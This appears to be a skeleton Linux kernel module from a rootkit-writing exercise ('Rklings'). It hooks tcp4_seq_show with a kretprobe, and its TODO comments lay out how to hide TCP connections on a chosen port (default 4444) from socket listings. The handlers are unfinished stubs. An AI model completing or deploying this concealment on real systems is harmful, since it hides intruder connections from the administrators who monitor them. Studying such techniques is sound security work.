// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/inet.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <net/inet_sock.h>
#include <net/sock.h>

static unsigned short hidden_port = 4444;
module_param(hidden_port, ushort, 0400);

struct rk_tcp_data {
	struct seq_file *seq;
	size_t prev_count;
};

static int rk_tcp_show_entry(struct kretprobe_instance *inst,
			     struct pt_regs *regs)
{
	struct rk_tcp_data *data = (void *)inst->data;

	data->seq = NULL;

	/*
	 * TODO: suppress output for the hidden port.
	 *
	 * tcp4_seq_show receives two arguments in the registers:
	 *   regs->di = struct seq_file *seq  (the output buffer)
	 *   regs->si = void *v              (the current socket)
	 *
	 * When v == SEQ_START_TOKEN, this is the header line, let it
	 * through by returning 0.
	 *
	 * Otherwise, cast v to struct sock *, then use inet_sk() to
	 * get the inet_sock and compare inet->inet_sport (network
	 * byte order) against hidden_port (host byte order).
	 *
	 * If the port matches, save seq and seq->count in data so
	 * the return handler can rewind the buffer.
	 */
	return 0;
}

static int rk_tcp_show_return(struct kretprobe_instance *inst,
			      struct pt_regs *regs)
{
	struct rk_tcp_data *data = (void *)inst->data;

	/*
	 * TODO: if seq was saved in entry, rewind seq->count
	 * to prev_count to erase the output for this entry.
	 */
	(void)data;
	return 0;
}

static struct kretprobe tcp_probe = {
	.kp.symbol_name = "tcp4_seq_show",
	.entry_handler = rk_tcp_show_entry,
	.handler = rk_tcp_show_return,
	.data_size = sizeof(struct rk_tcp_data),
	.maxactive = 8,
};

static int __init rk_init(void)
{
	if (!hidden_port)
		return -EINVAL;
	return register_kretprobe(&tcp_probe);
}

static void __exit rk_exit(void)
{
	unregister_kretprobe(&tcp_probe);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
